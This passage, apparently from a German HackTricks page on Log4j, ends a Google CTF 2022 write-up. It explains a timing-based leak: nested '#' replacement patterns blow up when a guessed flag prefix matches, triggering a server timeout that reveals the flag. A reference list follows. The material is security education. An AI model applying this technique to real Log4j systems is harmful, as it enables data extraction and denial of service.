> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Wenn das Flag mit `flagGuess` beginnt, wird das gesamte Flag durch 29 `#`-Zeichen ersetzt (ich habe dieses Zeichen verwendet, da es wahrscheinlich nicht Teil des Flags ist). **Jedes der resultierenden 29 `#`-Zeichen wird dann durch 54 `#`-Zeichen ersetzt**. Dieser Prozess wird **6 Mal** wiederholt, was zu insgesamt ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-Zeichen führt!**
>
> Das Ersetzen so vieler `#`-Zeichen wird den 10-Sekunden-Timeout der Flask-Anwendung auslösen, was wiederum dazu führt, dass der HTTP-Statuscode 500 an den Benutzer gesendet wird. (Wenn das Flag nicht mit `flagGuess` beginnt, erhalten wir einen Statuscode, der nicht 500 ist)

## Referenzen

- [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
- [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
- [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
- [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
- [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
- [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

{{#include ../../banners/hacktricks-training.md}}
